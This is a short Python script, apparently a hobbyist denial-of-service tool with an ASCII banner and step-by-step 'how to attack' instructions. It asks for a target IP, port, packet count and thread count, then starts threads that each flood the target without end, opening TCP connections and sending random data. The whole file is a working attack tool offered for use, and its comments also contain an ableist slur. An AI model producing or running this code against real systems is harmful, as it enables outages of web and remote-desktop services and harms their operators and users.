#Add The Proxy By Yourself Don't Ask Me To Add Proxy NERD
#I Will Add Socks5 Later
#Don't being an retarded skid


import socket
import random
import threading


print("▄████   █████  ▓█████ ▓█████ ▒███████▒ ")   
print("██▒ ▀█▒▓██ ▒ ██▒▓█   ▀ ▓█   ▀ ▒ ▒ ▒ ▄▀░")
print("▒██░▄▄▄░▓██ ░▄█ ▒▒███   ▒███   ░ ▒ ▄▀▒░ ")
print("░▓█  ██▓▒██▀▀█▄  ▒▓█  ▄ ▒▓█  ▄   ▄▀▒   ░")  
print("░▒▓███▀▒░██▓ ▒██▒░▒████▒░▒████▒▒███████▒")
print("░▒   ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░░ ▒░ ░░▒▒ ▓░▒░▒  ")

print("TETAP LAH BANGUNKAN DIRI MU DAN STAY KUAT WALAU DIA TELAH MENINGGALKAN MU:>")


print("╔══════════════════════════════════╗")
print("║ Example How To Attack!           ║")
print("║ 1. Put The IP Target You Want!   ║")
print("║ 2. Then Put The Port 80/3389/443!║")
print("║ 3. AFter That Put Packet You Want║")
print("║ 4. Put Threads How Much You Want!║")
print("║ 5. Then Enter And Susccesfully!  ║")
print("╚══════════════════════════════════╝")

ip = str(input("[+] Enter RDP IP : "))
port = int(input("[+] Enter RDP Port (80/3389/443)   : "))
times = int(input("[+] Enter Packet (900048) : "))
threads = int(input("[+] Enter Thread (900048) : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"</> ATTACK SENT!")
        except socket.error:
            s.close()
            print("</> Dddosed By AstroGanzz => ",ip," With Port : ",port,"!")
			
for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
